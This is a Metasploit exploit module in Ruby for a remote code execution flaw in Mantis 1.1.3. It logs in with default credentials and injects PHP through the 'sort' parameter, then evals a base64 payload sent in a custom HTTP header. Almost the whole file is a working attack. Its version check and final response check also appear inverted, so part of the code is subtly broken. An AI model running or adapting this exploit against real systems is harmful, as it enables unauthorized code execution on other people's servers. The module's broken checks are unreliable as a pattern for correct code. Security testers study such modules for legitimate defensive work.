##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Mantis v1.1.3 Remote Code Execution',
      'Description'    => %q{
        Mantis v1.1.3 and earlier are vulnerable to a post-authentication Remote Code Execution vulnerability in the sort parameter of the manage_proj_page.php file.
      },
      'Author'         => [
        'EgiX',      # Exploit-DB Entry Author
        'Lars Sorenson'      # MSF module author
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['EDB', '6768'],
        ],
       'Privileged' => false,
       'Platform'   => ['php'],
       'Arch'       => ARCH_PHP,
       'Targets' =>
          [
            [ 'Mantis 1.1.3', { } ],
          ],
      'DisclosureDate' => 'Oct 16, 2008',
      'DefaultTarget' => 0))
     register_options(
      [
        OptString.new('TARGETURI', [true, 'The path to the Mantis installation', '/mantisbt/']),
        OptString.new('USERNAME', [ true, 'The username to log in as', 'administrator']),
        OptString.new('PASSWORD', [ true, 'The password to log in with', 'root']),
        Opt::RPORT(80)
      ])
  end

  def check
    res = send_request_cgi({
      'uri'    => normalize_uri(target_uri.path, 'index.php'),
      'method' => 'GET'
    })

    unless res
      vprint_error 'Connection failed'
      return CheckCode::Unknown
    end

    unless res.code == 200 && res.body.include?('Mantis 1.1.3')
      return CheckCode::Appears
    end

    CheckCode::Safe
  end

  def login
    res = send_request_cgi({
        'method'   => 'GET',
        'uri'      => normalize_uri(target_uri.path, 'login_page.php'),
    })    
    res = send_request_cgi({
      'uri'       => normalize_uri(target_uri.path, 'login.php'),
      'method'    => 'POST',
      'vars_post' => {
        'username': datastore['username'],
        'password': datastore['password']
      },
      'headers' => {
        'Cookie': "PHPSESSID=#{res.get_cookies}"
      }
    })
    fail_with(Failure::NoAccess, 'Login failed') unless res && res.code == 302
    fail_with(Failure::NoAccess, 'Wrong credentials') unless res && !res.redirection.to_s.include?('login_page.php')
    res.get_cookies
  end

  def exploit
    fail_with(Failure::NotVulnerable, 'Target is not vulnerable') unless check == CheckCode::Appears

    cookie = login
    payload_clean = payload.encoded.gsub(/(\s+)|(#.*)/, '')
    payload_b64 = Rex::Text.encode_base64(payload_clean)
    data = {
      'sort' => "']);}error_reporting(0);print(_code_);eval(base64_decode(\$_SERVER[HTTP_CMD]));die();%23",
    }
    res = send_request_cgi({
      'uri'       => normalize_uri(target_uri.path, 'manage_proj_page.php'),
      'method'    => 'GET',
      'vars_get' => data,
      'headers' => {
        'Connection': 'close',
        'Cookie': "#{cookie}",
        'Cmd': payload_b64
      },
      'encode_params' => false,
    })
    unless res.nil?
      fail_with(Failure::NoAccess, 'Host disconnected during exploit')
   end
  end
end

